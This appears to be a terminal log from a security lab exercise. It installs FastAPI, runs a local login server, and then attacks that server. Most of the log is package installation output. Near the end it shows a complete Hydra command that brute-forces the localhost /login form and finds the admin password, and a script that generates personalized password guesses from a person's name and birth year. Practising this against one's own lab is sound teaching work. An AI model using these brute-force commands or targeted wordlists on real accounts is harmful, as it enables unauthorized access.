+Collecting shellingham>=1.3.0 (from typer>=0.16.0->fastapi-cli>=0.0.32->fastapi-cli[standard]>=0.0.32; extra == "standard"->fastapi[standard])
+  Downloading shellingham-1.5.4-py2.py3-none-any.whl.metadata (3.5 kB)
+Collecting markdown-it-py>=2.2.0 (from rich>=13.7.1->rich-toolkit>=0.14.8->fastapi-cli>=0.0.32->fastapi-cli[standard]>=0.0.32; extra == "standard"->fastapi[standard])
+  Downloading markdown_it_py-4.2.0-py3-none-any.whl.metadata (7.4 kB)
+Collecting pygments<3.0.0,>=2.13.0 (from rich>=13.7.1->rich-toolkit>=0.14.8->fastapi-cli>=0.0.32->fastapi-cli[standard]>=0.0.32; extra == "standard"->fastapi[standard])
+  Downloading pygments-2.21.0-py3-none-any.whl.metadata (2.5 kB)
+Collecting mdurl~=0.1 (from markdown-it-py>=2.2.0->rich>=13.7.1->rich-toolkit>=0.14.8->fastapi-cli>=0.0.32->fastapi-cli[standard]>=0.0.32; extra == "standard"->fastapi[standard])
+  Downloading mdurl-0.1.2-py3-none-any.whl.metadata (1.6 kB)
+Downloading annotated_doc-0.0.5-py3-none-any.whl (5.3 kB)
+Downloading email_validator-2.3.0-py3-none-any.whl (35 kB)
+Downloading fastapi_cli-0.0.32-py3-none-any.whl (14 kB)
+Downloading fastar-0.12.0-cp312-cp312-manylinux_2_17_aarch64.manylinux2014_aarch64.whl (753 kB)
+   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 753.8/753.8 kB 525.4 kB/s eta 0:00:00
+Downloading httpx-0.28.1-py3-none-any.whl (73 kB)
+   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 73.5/73.5 kB 590.4 kB/s eta 0:00:00
+Downloading httpcore-1.0.9-py3-none-any.whl (78 kB)
+   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 78.8/78.8 kB 805.9 kB/s eta 0:00:00
+Downloading jinja2-3.1.6-py3-none-any.whl (134 kB)
+   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 134.9/134.9 kB 1.0 MB/s eta 0:00:00
+Downloading opentelemetry_api-1.45.1-py3-none-any.whl (60 kB)
+   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 60.3/60.3 kB 1.2 MB/s eta 0:00:00
+Downloading opentelemetry_exporter_otlp_proto_http-1.45.1-py3-none-any.whl (22 kB)
+Downloading opentelemetry_exporter_http_transport-0.66b1-py3-none-any.whl (12 kB)
+Downloading opentelemetry_exporter_otlp_common-0.66b1-py3-none-any.whl (12 kB)
+Downloading opentelemetry_exporter_otlp_proto_common-1.45.1-py3-none-any.whl (15 kB)
+Downloading opentelemetry_proto-1.45.1-py3-none-any.whl (72 kB)
+   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 72.5/72.5 kB 848.0 kB/s eta 0:00:00
+Downloading opentelemetry_sdk-1.45.1-py3-none-any.whl (140 kB)
+   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 140.1/140.1 kB 687.9 kB/s eta 0:00:00
+Downloading opentelemetry_semantic_conventions-0.66b1-py3-none-any.whl (206 kB)
+   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 206.3/206.3 kB 662.9 kB/s eta 0:00:00
+Downloading pydantic-2.14.1-py3-none-any.whl (488 kB)
+   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 488.1/488.1 kB 913.6 kB/s eta 0:00:00
+Downloading pydantic_core-2.50.1-cp312-cp312-manylinux_2_17_aarch64.manylinux2014_aarch64.whl (2.0 MB)
+   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 2.0/2.0 MB 964.4 kB/s eta 0:00:00
+Downloading pydantic_extra_types-2.11.1-py3-none-any.whl (79 kB)
+   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 79.5/79.5 kB 2.6 MB/s eta 0:00:00
+Downloading pydantic_settings-2.15.0-py3-none-any.whl (69 kB)
+   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 69.4/69.4 kB 1.1 MB/s eta 0:00:00
+Downloading python_multipart-0.0.32-py3-none-any.whl (30 kB)
+Downloading starlette-1.7.0-py3-none-any.whl (78 kB)
+   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 79.0/79.0 kB 1.5 MB/s eta 0:00:00
+Downloading typing_extensions-4.16.0-py3-none-any.whl (45 kB)
+   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 45.6/45.6 kB 1.9 MB/s eta 0:00:00
+Downloading typing_inspection-0.4.4-py3-none-any.whl (14 kB)
+Downloading uvicorn-0.54.0-py3-none-any.whl (87 kB)
+   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 87.4/87.4 kB 1.3 MB/s eta 0:00:00
+Downloading fastapi-0.143.0-py3-none-any.whl (144 kB)
+   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 144.7/144.7 kB 659.6 kB/s eta 0:00:00
+Downloading annotated_types-0.8.0-py3-none-any.whl (13 kB)
+Downloading anyio-4.15.1-py3-none-any.whl (132 kB)
+   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 132.1/132.1 kB 662.8 kB/s eta 0:00:00
+Downloading click-8.5.0-py3-none-any.whl (125 kB)
+   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 125.3/125.3 kB 1.1 MB/s eta 0:00:00
+Downloading dnspython-2.9.0-py3-none-any.whl (354 kB)
+   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 354.8/354.8 kB 1.0 MB/s eta 0:00:00
+Downloading fastapi_cloud_cli-0.26.0-py3-none-any.whl (108 kB)
+   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 108.7/108.7 kB 1.0 MB/s eta 0:00:00
+Downloading googleapis_common_protos-1.75.5-py3-none-any.whl (307 kB)
+   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 307.7/307.7 kB 894.1 kB/s eta 0:00:00
+Downloading h11-0.16.0-py3-none-any.whl (37 kB)
+Downloading httptools-0.9.0-cp312-cp312-manylinux2014_aarch64.manylinux_2_17_aarch64.manylinux_2_28_aarch64.whl (549 kB)
+   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 549.2/549.2 kB 1.0 MB/s eta 0:00:00
+Downloading idna-3.20-py3-none-any.whl (69 kB)
+   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 69.6/69.6 kB 1.4 MB/s eta 0:00:00
+Downloading markupsafe-3.0.4-cp312-cp312-manylinux2014_aarch64.manylinux_2_17_aarch64.manylinux_2_28_aarch64.whl (24 kB)
+Downloading python_dotenv-1.2.4-py3-none-any.whl (23 kB)
+Downloading pyyaml-6.0.3-cp312-cp312-manylinux2014_aarch64.manylinux_2_17_aarch64.manylinux_2_28_aarch64.whl (775 kB)
+   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 775.1/775.1 kB 1.2 MB/s eta 0:00:00
+Downloading requests-2.34.2-py3-none-any.whl (73 kB)
+   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 73.1/73.1 kB 1.3 MB/s eta 0:00:00
+Downloading certifi-2026.7.22-py3-none-any.whl (136 kB)
+   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 137.0/137.0 kB 1.3 MB/s eta 0:00:00
+Downloading rich_toolkit-0.20.6-py3-none-any.whl (39 kB)
+Downloading typer-0.27.3-py3-none-any.whl (123 kB)
+   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 123.3/123.3 kB 750.1 kB/s eta 0:00:00
+Downloading uvloop-0.23.0-cp312-cp312-manylinux2014_aarch64.manylinux_2_17_aarch64.manylinux_2_28_aarch64.whl (4.4 MB)
+   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 4.4/4.4 MB 741.0 kB/s eta 0:00:00
+Downloading watchfiles-1.3.0-cp310-abi3-manylinux_2_17_aarch64.manylinux2014_aarch64.whl (454 kB)
+   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 455.0/455.0 kB 550.4 kB/s eta 0:00:00
+Downloading websockets-17.2-cp312-cp312-manylinux2014_aarch64.manylinux_2_17_aarch64.manylinux_2_28_aarch64.whl (226 kB)
+   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 226.5/226.5 kB 570.4 kB/s eta 0:00:00
+Downloading agent_detector-2.0.0-py3-none-any.whl (9.4 kB)
+Downloading charset_normalizer-3.5.2-cp312-cp312-manylinux2014_aarch64.manylinux_2_17_aarch64.manylinux_2_28_aarch64.whl (246 kB)
+   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 246.7/246.7 kB 363.0 kB/s eta 0:00:00
+Downloading detect_installer-0.2.1-py3-none-any.whl (5.4 kB)
+Downloading protobuf-7.36.2-cp310-abi3-manylinux2014_aarch64.whl (344 kB)
+   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 344.2/344.2 kB 598.0 kB/s eta 0:00:00
+Downloading rich-15.0.0-py3-none-any.whl (310 kB)
+   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 310.7/310.7 kB 526.0 kB/s eta 0:00:00
+Downloading rignore-0.8.1-cp312-cp312-manylinux_2_17_aarch64.manylinux2014_aarch64.whl (884 kB)
+   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 884.6/884.6 kB 444.2 kB/s eta 0:00:00
+Downloading sentry_sdk-2.72.0-py3-none-any.whl (544 kB)
+   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 544.8/544.8 kB 431.3 kB/s eta 0:00:00
+Downloading shellingham-1.5.4-py2.py3-none-any.whl (9.8 kB)
+Downloading urllib3-2.8.0-py3-none-any.whl (135 kB)
+   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 135.7/135.7 kB 424.3 kB/s eta 0:00:00
+Downloading markdown_it_py-4.2.0-py3-none-any.whl (91 kB)
+   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 91.7/91.7 kB 386.4 kB/s eta 0:00:00
+Downloading pygments-2.21.0-py3-none-any.whl (1.3 MB)
+   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 1.3/1.3 MB 485.1 kB/s eta 0:00:00
+Downloading mdurl-0.1.2-py3-none-any.whl (10.0 kB)
+Installing collected packages: websockets, uvloop, urllib3, typing-extensions, shellingham, rignore, pyyaml, python-multipart, python-dotenv, pygments, protobuf, mdurl, MarkupSafe, idna, httptools, h11, fastar, dnspython, detect-installer, click, charset_normalizer, certifi, annotated-types, annotated-doc, agent-detector, uvicorn, typing-inspection, sentry-sdk, requests, pydantic-core, opentelemetry-proto, opentelemetry-api, markdown-it-py, jinja2, httpcore, googleapis-common-protos, email-validator, anyio, watchfiles, starlette, rich, pydantic, opentelemetry-semantic-conventions, opentelemetry-exporter-otlp-proto-common, opentelemetry-exporter-http-transport, httpx, typer, rich-toolkit, pydantic-settings, pydantic-extra-types, opentelemetry-sdk, fastapi, opentelemetry-exporter-otlp-common, fastapi-cloud-cli, fastapi-cli, opentelemetry-exporter-otlp-proto-http
+Successfully installed MarkupSafe-3.0.4 agent-detector-2.0.0 annotated-doc-0.0.5 annotated-types-0.8.0 anyio-4.15.1 certifi-2026.7.22 charset_normalizer-3.5.2 click-8.5.0 detect-installer-0.2.1 dnspython-2.9.0 email-validator-2.3.0 fastapi-0.143.0 fastapi-cli-0.0.32 fastapi-cloud-cli-0.26.0 fastar-0.12.0 googleapis-common-protos-1.75.5 h11-0.16.0 httpcore-1.0.9 httptools-0.9.0 httpx-0.28.1 idna-3.20 jinja2-3.1.6 markdown-it-py-4.2.0 mdurl-0.1.2 opentelemetry-api-1.45.1 opentelemetry-exporter-http-transport-0.66b1 opentelemetry-exporter-otlp-common-0.66b1 opentelemetry-exporter-otlp-proto-common-1.45.1 opentelemetry-exporter-otlp-proto-http-1.45.1 opentelemetry-proto-1.45.1 opentelemetry-sdk-1.45.1 opentelemetry-semantic-conventions-0.66b1 protobuf-7.36.2 pydantic-2.14.1 pydantic-core-2.50.1 pydantic-extra-types-2.11.1 pydantic-settings-2.15.0 pygments-2.21.0 python-dotenv-1.2.4 python-multipart-0.0.32 pyyaml-6.0.3 requests-2.34.2 rich-15.0.0 rich-toolkit-0.20.6 rignore-0.8.1 sentry-sdk-2.72.0 shellingham-1.5.4 starlette-1.7.0 typer-0.27.3 typing-extensions-4.16.0 typing-inspection-0.4.4 urllib3-2.8.0 uvicorn-0.54.0 uvloop-0.23.0 watchfiles-1.3.0 websockets-17.2
+(venv) root@c64f813bd218:/home/lab12# nano main.py
+(venv) root@c64f813bd218:/home/lab12# fastapi dev main.py --host 0.0.0.0 --port 8000
+
+ ⚡️ Starting FastAPI in development mode
+ 
+ 🐍 Using import string: main:app
+ 
+ 🌐 Server started at http://0.0.0.0:8000
+    Documentation at http://0.0.0.0:8000/docs
+ 
+  Logs:
+ 
+ ▕  Will watch for changes in these directories: ['/home/lab12']
+ ▕  Uvicorn running on http://0.0.0.0:8000 (Press CTRL+C to quit)
+ ▕  Started reloader process [875] using WatchFiles
+ ▕  Started server process [877]
+ ▕  Waiting for application startup.
+ ▕  Application startup complete.
+
+
+docker exec -it lab5-ubuntu bash
+ ▕  127.0.0.1:36582 - "GET /login HTTP/1.0" 405
+ ▕  127.0.0.1:36586 - "GET /login HTTP/1.0" 405
+ ▕  127.0.0.1:36600 - "GET /login HTTP/1.0" 405
+ ▕  127.0.0.1:36616 - "GET /login HTTP/1.0" 405
+ ▕  127.0.0.1:36622 - "POST /login HTTP/1.0" 200
+ ▕  127.0.0.1:36636 - "POST /login HTTP/1.0" 200
+ ▕  127.0.0.1:36624 - "POST /login HTTP/1.0" 200
+ ▕  127.0.0.1:36638 - "POST /login HTTP/1.0" 200
+ ▕  WatchFiles detected changes in 'personalized_passwords.py'. Reloading...
+
+ ▕  Shutting down
+ ▕  Waiting for application shutdown.
+ ▕  Application shutdown complete.
+ ▕  Finished server process [877]
+ ▕  Started server process [903]
+ ▕  Waiting for application startup.
+ ▕  Application startup complete.
+
+root@c64f813bd218:/# cd /home/lab12
+root@c64f813bd218:/home/lab12# printf 'guest\nadmin\n' > usernames.txt
+root@c64f813bd218:/home/lab12# printf 'password123\n12345admin\n' > passwords.txt
+root@c64f813bd218:/home/lab12# cat usernames.txt
+cat passwords.txt
+guest
+admin
+password123
+12345admin
+root@c64f813bd218:/home/lab12# hydra -f -I -V -L usernames.txt -P passwords.txt -s 8000 localhost http-form-post "/login:username=^USER^&password=^PASS^:F=Invalid"
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-10-13 10:55:44
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 4 login tries (l:2/p:2), ~1 try per task
+[DATA] attacking http-post-form://localhost:8000/login:username=^USER^&password=^PASS^:F=Invalid
+[ATTEMPT] target localhost - login "guest" - pass "password123" - 1 of 4 [child 0] (0/0)
+[ATTEMPT] target localhost - login "guest" - pass "12345admin" - 2 of 4 [child 1] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "password123" - 3 of 4 [child 2] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "12345admin" - 4 of 4 [child 3] (0/0)
+[8000][http-post-form] host: localhost   login: admin   password: 12345admin
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-10-13 10:55:44
+root@c64f813bd218:/home/lab12# login: admin
+bash: login:: command not found
+root@c64f813bd218:/home/lab12# password: 12345admin
+bash: password:: command not found
+root@c64f813bd218:/home/lab12# cd /home/lab12
+root@c64f813bd218:/home/lab12# nano personalized_passwords.py
+root@c64f813bd218:/home/lab12# python3 personalized_passwords.py
+Generated 12 password candidates.
+root@c64f813bd218:/home/lab12# cat personalized_passwords.txt
+20017
+Alex
+Alex2001
+Alex7
+AlexSmith
+Smith
+Smith2001
+alex
+alex2001
+alex7
+alexsmith
+smith
+root@c64f813bd218:/home/lab12# exit
+exit
